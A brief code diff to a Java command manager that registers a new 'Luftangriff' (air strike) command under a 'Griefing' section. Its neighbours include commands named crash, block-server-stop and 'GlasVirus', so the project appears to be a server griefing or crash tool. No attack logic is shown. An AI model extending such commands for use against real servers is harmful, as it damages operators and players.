@@ -25,6 +25,7 @@ package de.Garkolym.Commands;
 
 import java.util.ArrayList;
 
+import de.Garkolym.Commands.Griefing.CommandLuftangriff;
 import de.Garkolym.Commands.Griefing.CommandUltraCactus;
 import de.Garkolym.Commands.Server.CommandBlockServerStop;
 import de.Garkolym.Commands.Server.CommandCrash;
@@ -51,6 +52,7 @@ public class CommandManager {
 		this.getCommandList().add(new CommandGlasVirus());
 		// Griefing
 		this.getCommandList().add(new CommandUltraCactus());
+		this.getCommandList().add(new CommandLuftangriff());
 		
 	}
 	
